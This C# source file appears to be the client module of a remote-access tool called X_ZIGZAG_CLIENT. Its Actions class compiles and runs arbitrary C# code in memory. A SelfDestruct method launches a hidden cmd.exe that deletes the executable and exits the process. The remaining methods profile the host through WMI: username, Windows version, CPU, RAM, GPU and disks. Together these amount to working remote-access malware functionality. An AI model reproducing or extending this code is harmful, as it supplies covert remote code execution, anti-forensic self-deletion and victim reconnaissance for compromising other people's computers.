using System.Diagnostics;
using System;
using System.Security.Principal;
using System.Management;
using System.Collections.Generic;
using System.Text;
using System.Threading.Tasks;
using System.Reflection;
using Microsoft.CSharp;
using System.CodeDom.Compiler;
namespace X_ZIGZAG_CLIENT
{
    internal class Actions
    {
        public static async Task<string> ExecuteCsharpCodeAsync(string code, object[] parameters)
        {
            var codeProvider = new CSharpCodeProvider();
            var compilerParams = new CompilerParameters
            {
                GenerateInMemory = true,
                GenerateExecutable = false,
                TreatWarningsAsErrors = false
            };
            compilerParams.ReferencedAssemblies.Add("System.dll");
            compilerParams.ReferencedAssemblies.Add("System.Runtime.dll");
            compilerParams.ReferencedAssemblies.Add("System.Threading.Tasks.dll");
            compilerParams.ReferencedAssemblies.Add("System.Net.Http.dll");
            compilerParams.ReferencedAssemblies.Add("System.Web.Extensions.dll");
            compilerParams.ReferencedAssemblies.Add("Microsoft.CSharp.dll");
            compilerParams.ReferencedAssemblies.Add("System.Security.dll");
            compilerParams.ReferencedAssemblies.Add("System.Dynamic.dll");
            compilerParams.ReferencedAssemblies.Add("System.Core.dll");
            compilerParams.ReferencedAssemblies.Add("mscorlib.dll");

            CompilerResults results = codeProvider.CompileAssemblyFromSource(compilerParams, code);

            if (results.Errors.HasErrors)
            {
                var errorBuilder = new StringBuilder();
                foreach (CompilerError error in results.Errors)
                {
                    errorBuilder.AppendLine($"Error ({error.ErrorNumber}): {error.ErrorText}");
                }
                return errorBuilder.ToString();
            }
            else
            {
                Assembly assembly = results.CompiledAssembly;
                Type type = assembly.GetType("Script");
                MethodInfo method = type?.GetMethod("ExecuteAsync");

                if (method == null)
                {
                    return "No 'ExecuteAsync' method found in the script.";
                }

                try
                {
                    object obj = Activator.CreateInstance(type);

                    // Pass the parameters when invoking the method
                    Task<string> task = (Task<string>)method.Invoke(obj, parameters);
                    string result = await task;
                    return result ?? "Execution completed with no output.";
                }
                catch (Exception ex)
                {
                    return $"Error during execution: {ex.Message}";
                }
            }
        }



        public static void SelfDestruct()
        {
            string exeFilePath = Assembly.GetExecutingAssembly().Location;
            string command = $"/C timeout 5 && del \"{exeFilePath}\"";
            ProcessStartInfo info = new ProcessStartInfo("cmd.exe", command)
            {
                CreateNoWindow = true,
                UseShellExecute = false
            };
            Process.Start(info);
            Environment.Exit(0);
        }
        public static string GetUsername()
        {
            return WindowsIdentity.GetCurrent().Name;
        }
        public static string GetWindowsVersion()
        {

                try
                {
                    using (var searcher = new ManagementObjectSearcher("SELECT * FROM Win32_OperatingSystem"))
                    {
                    string info = "";
                        foreach (var obj in searcher.Get())
                            {
                                info += $"{obj["Caption"]} {obj["BuildNumber"]} {obj["OSArchitecture"]}";
                            }
                        return info;
                    }

                }
                catch (Exception)
                {
                }
                return "";
            
        }
        public static string GetSystemInfo()
        {
            StringBuilder sb = new StringBuilder();

            // CPU Information
            string cpuName = GetWMIValue("Win32_Processor", "Name").Replace("  "," ");
            while (cpuName.Contains("  "))
            {
                cpuName = cpuName.Replace("  ", " ");
            }
            int cpuCores = int.Parse(GetWMIValue("Win32_Processor", "NumberOfCores"));
            int cpuThreads = int.Parse(GetWMIValue("Win32_Processor", "NumberOfLogicalProcessors"));
            sb.AppendLine($"{cpuName} - {cpuCores}/{cpuThreads}");

            // RAM Information
            var ramInfo = GetRAMInfo();
            foreach (var ram in ramInfo)
            {
                sb.AppendLine(string.Format("{0} - {1} GB", ram.Item1, ram.Item2));
            }

            // GPU Information
            string gpuName = GetWMIValue("Win32_VideoController", "Name");
            sb.AppendLine($"{gpuName}");

            // Disk Information
            Dictionary<string, string> disks = new Dictionary<string, string>();
            using (var searcher = new ManagementObjectSearcher("SELECT * FROM Win32_DiskDrive"))
            using (var collection = searcher.Get())
            {
                foreach (var disk in collection)
                {
                    string model = disk["Model"].ToString();
                    long sizeBytes = long.Parse(disk["Size"].ToString());
                    double sizeGB = Math.Round((double)sizeBytes / (1024 * 1024 * 1024), 2);
                    disks.Add(model, $"{sizeGB} GB");
                }
            }

            int diskCount = 1;
            foreach (var disk in disks)
            {
                sb.AppendLine($"DISK {diskCount} {disk.Key} - {disk.Value}");
                diskCount++;
            }

            return sb.ToString();
        }
        static string GetWMIValue(string className, string propertyName)
        {
            try
            {
                using (var searcher = new ManagementObjectSearcher($"SELECT {propertyName} FROM {className}"))
                using (var collection = searcher.Get())
                {
                    foreach (var obj in collection)
                    {
                        return obj[propertyName]?.ToString() ?? "N/A";
                    }
                }
            }
            catch
            {
                return "N/A";
            }
            return "N/A";
        }

        static List<Tuple<string, double>> GetRAMInfo()
        {
            var ramList = new List<Tuple<string, double>>();

            try
            {
                using (var searcher = new ManagementObjectSearcher("SELECT Manufacturer, PartNumber, Capacity FROM Win32_PhysicalMemory"))
                using (var collection = searcher.Get())
                {
                    foreach (var ram in collection)
                    {
                        string manufacturer = ram["Manufacturer"].ToString().Trim();
                        string partNumber = ram["PartNumber"].ToString().Trim();
                        long capacityBytes = Convert.ToInt64(ram["Capacity"]);
                        double capacityGB = Math.Round((double)capacityBytes / (1024 * 1024 * 1024), 2);

                        string name = string.Format("{0} {1}", manufacturer, partNumber).Trim();
                        if (string.IsNullOrWhiteSpace(name))
                        {
                            name = "Unknown RAM";
                        }

                        ramList.Add(new Tuple<string, double>(name, capacityGB));
                    }
                }
            }
            catch
            {
            }

            return ramList;
        }

        


    }
}
